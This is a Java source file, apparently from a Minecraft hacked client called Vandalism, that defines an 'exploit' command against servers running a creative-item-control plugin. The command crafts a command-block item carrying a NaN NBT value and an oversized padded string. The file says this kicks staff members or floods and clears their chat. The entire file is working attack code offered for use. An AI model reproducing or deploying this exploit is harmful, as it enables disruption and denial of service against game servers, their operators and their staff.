/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.command.impl.exploit;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import de.nekosarekawaii.vandalism.feature.command.AbstractCommand;
import de.nekosarekawaii.vandalism.util.game.ChatUtil;
import de.nekosarekawaii.vandalism.util.game.ItemStackUtil;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;

import java.util.UUID;

public class CreativeItemControlCommand extends AbstractCommand {

    public CreativeItemControlCommand() {
        super(
                "Allows you to clear the chat of staff members " +
                        "and to kick staff members on servers where the plugin creative item control is installed.",
                Category.EXPLOIT,
                "creativeitemcontrol",
                "cic"
        );
    }

    @Override
    public void build(final LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("kick").executes(context -> {
            if (ItemStackUtil.giveItemStack(this.createCreativeItemControlItem(true), false)) {
                ChatUtil.infoChatMessage("Staff members should be kicked now.");
            }
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("clearchat").executes(context -> {
            if (ItemStackUtil.giveItemStack(this.createCreativeItemControlItem(false), false)) {
                ChatUtil.infoChatMessage("The chat of staff members should be cleared now.");
            }
            return SINGLE_SUCCESS;
        }));
    }

    private ItemStack createCreativeItemControlItem(final boolean kick) {
        final ItemStack item = new ItemStack(Items.COMMAND_BLOCK);
        final NbtCompound tag = new NbtCompound();
        tag.putDouble(UUID.randomUUID().toString(), Double.NaN);
        final StringBuilder hacked = new StringBuilder(), toAdd = new StringBuilder();
        for (int i = 0; i < (kick ? 5 : 8); i++) toAdd.append(' ').append(toAdd);
        for (int i = 0; i < (kick ? 900 : 2000); i++) hacked.append(kick ? "§c§l" : "").append(toAdd);
        tag.putString("z", hacked.toString());
        item.setNbt(tag);
        return item;
    }

}
